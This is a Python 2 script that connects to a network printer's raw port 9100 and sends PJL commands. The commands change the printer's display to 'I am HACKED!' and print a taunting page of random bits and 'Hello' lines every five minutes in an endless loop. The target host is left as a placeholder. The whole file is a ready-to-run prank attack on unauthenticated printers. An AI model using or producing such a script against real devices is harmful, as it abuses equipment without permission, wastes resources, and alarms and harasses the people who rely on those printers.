#!/usr/bin/env python

import socket
import sys
import os.path
import time
import random

host = 'x.x.x.x'
port = 9100

a = 1
while True:
    sock = socket.socket()
    try:
        sock.connect((host, port))
    except socket.error, e:
        print 'Connection error %s: %s.' % (e[0], e[1])
        break
    
    title = "I am HACKED!"
    job = "Spelling mistake 0x7b"
    message = "\r\n\r\nI have been hacked by Mr. Monty Python. He walks around college occasionally..\r\nI would be careful if I was you..\r\n\r\nFact:\r\nDid you know that Monty Python's Flying Circus has a number generator?\r\nWell I do now! And I am convinced you do too.\r\n\r\nListen. From now on, I will remind you every 5 minutes about this..\r\nIt is now "+time.ctime()+"\r\n\r\nFor the %sth time the generated said the following:\r\n" % str(a)
    message = message + "\r\nSeeding the generator:.......\r\n"

    for abc in range(0, 6):
        for block in range(0, 6):
            for abcd in range(0, 8):
                randed = round(random.random())
                if (randed == 0):
                    message = message + "0"
                else:
                    message = message + "1"
            message = message + " "
        message = message + "\r\n"

    message = message + "\r\nOutcome:\r\n"
    for i in range(0, 11):
        message = message + " "+str(a)+": Hello for "+str(i+1)+"th time! Say \"Hello\" back please!\r\n"
    copies = "1"
    
    command = "\x1B%%-12345X@PJL RDYMSG DISPLAY = \"%s\"\r\n" % title
    command = command + "@PJL JOB NAME = \"%s\"\r\n" % job
    command = command + "@PJL SET COPES = %s\r\n" % copies
    command = command + "@PJL SET RET = OFF\r\n"
    command = command + "@PJL ENTER LANGUAGE = PCL\r\n"
    command = command + "\x1B\r\n%s\x1BE\7E\x1B%%-12345X@PJL \r\n" % message
    command = command + "@PJL EOJ\r\n"
    command = command + "\x1B%%-12345X\r\n"
    
    print 'Sending print job to %s title %s %s' % (host, title, message)
    
    sock.sendall(command)

    a = a+1
    
    time.sleep(60*5)
